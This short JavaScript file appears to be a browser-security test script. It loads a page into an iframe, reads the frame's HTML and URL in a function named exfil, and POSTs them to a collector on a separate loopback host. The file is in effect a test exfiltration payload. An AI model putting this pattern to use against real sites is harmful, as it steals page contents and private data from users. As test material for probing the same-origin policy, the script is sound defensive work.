async function exfil() {
	const doc = document.getElementById("mqif.000").contentDocument;
	if (doc) {
		const de = doc.documentElement;
		if (de) {
			const res = await fetch("http://127.0.2.1:8080/cd/mq", {
				method: "POST",
				headers: {
				    "Content-Type": "application/x-www-form-urlencoded",
				  },
				body: new URLSearchParams({
					key: "mq13",
					page: doc.location.href,
					contents: de.innerHTML,
				}),
			});
		}
	}
}

let body = document.getElementsByTagName("body")[0];
// https://stackoverflow.com/questions/25098021/securityerror-blocked-a-frame-with-origin-from-accessing-a-cross-origin-frame
// iframe src must match origin in all sane browsers
body.innerHTML = "<iframe id=\"mqif.000\" src=\"https://127.0.3.2:8443/\"></iframe>";
let frame = document.getElementById("mqif.000");
frame.addEventListener("load", function () {
	console.log("ready");
	exfil();
})